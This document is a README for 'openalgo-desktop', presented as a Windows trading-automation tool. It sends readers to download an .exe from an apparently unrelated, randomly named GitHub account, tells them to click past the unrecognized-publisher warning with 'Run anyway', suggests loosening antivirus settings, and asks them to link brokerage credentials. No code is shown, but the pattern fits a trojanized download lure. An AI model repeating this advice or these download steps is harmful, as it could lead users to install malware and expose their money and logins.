# 📈 openalgo-desktop - Trade markets using automated custom strategies

[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Hoganorectolobidae875/openalgo-desktop)

openalgo-desktop provides tools for individual investors to build and run trading strategies. This software connects to your brokerage account and executes trades based on rules you set. You maintain control over your capital while the system manages order routing and trade monitoring.

## 📥 How to download the software

Visit the [official releases page](https://github.com/Hoganorectolobidae875/openalgo-desktop) to get the installer for your computer. 

1. Click the link above to reach the download page.
2. Look for the section labeled "Assets."
3. Select the file ending in .exe to start your download.
4. Save the file to your computer desktop or downloads folder.

## 🖥️ System requirements

Ensure your computer meets these standards for a stable experience:

* Operating System: Windows 10 or Windows 11.
* Memory: 8 GB of RAM or more.
* Storage: 500 MB of free space for installation.
* Connection: A stable internet connection for real-time market data.

## ⚙️ Installation steps

Follow these steps to set up the application on your machine:

1. Locate the .exe file you downloaded.
2. Double-click the file to start the installer.
3. Choose your preferred installation folder and click Next.
4. Follow the remaining window prompts to complete the setup.
5. Click Finish to launch the program for the first time.

If your computer shows a security warning about unrecognized publishers, click "More info" and then "Run anyway" to allow the software to open.

## 🚀 Running your first strategy

The dashboard displays your account balance, active positions, and open orders. You can configure your trading rules through the settings menu.

1. Open the application from your desktop shortcut.
2. Navigate to the Account tab and link your brokerage credentials through the secure interface.
3. Open the Strategy Designer to select the assets you wish to monitor.
4. Define your entry and exit points for your trades.
5. Save your strategy and flip the activation switch on the main dashboard to start monitoring the market.

## 🛡️ Managing risk

Always test your strategies with small capital first. Use the paper trading mode to see how your rules perform against live market data without risking real money. You can enable or disable paper trading in the Settings menu. Monitor your account regularly to ensure the software aligns with your investment goals.

## 🛠️ Frequently asked questions

* Does the software run while my computer is turned off?
No. The application requires an active internet connection and a running computer to execute trades.

* Can I use multiple strategies at once?
Yes. You may define and run multiple rules simultaneously as long as your system resources allow.

* How do I update the software?
The application checks for updates on startup. If a new version exists, you will see a prompt to download and install the latest features.

* Is my data secure?
The software stores your credentials locally on your machine. We do not transmit your login information to external servers.

## 🔧 Troubleshooting common problems

If you experience issues, review these common fixes:

* Software fails to open: Ensure your Windows operating system is fully updated. Check your antivirus settings to confirm it allows the program to communicate with the internet.
* Connection errors: Verify your internet connection. If the issue persists, check your brokerage provider to ensure their server status is currently online.
* Strategy not firing: Confirm that you clicked the "Activate" button on the dashboard. Check your strategy settings to ensure the price triggers are realistic based on current market conditions.

## 📖 Strategy definition guide

You define strategies by selecting specific indicators. You can choose from moving averages, volume trends, and price changes. Drag and drop these indicators into the strategy builder to create a sequence of events. The system tracks these components in real-time. You can save different versions of your plans to test which approaches yield the best results for your portfolio.
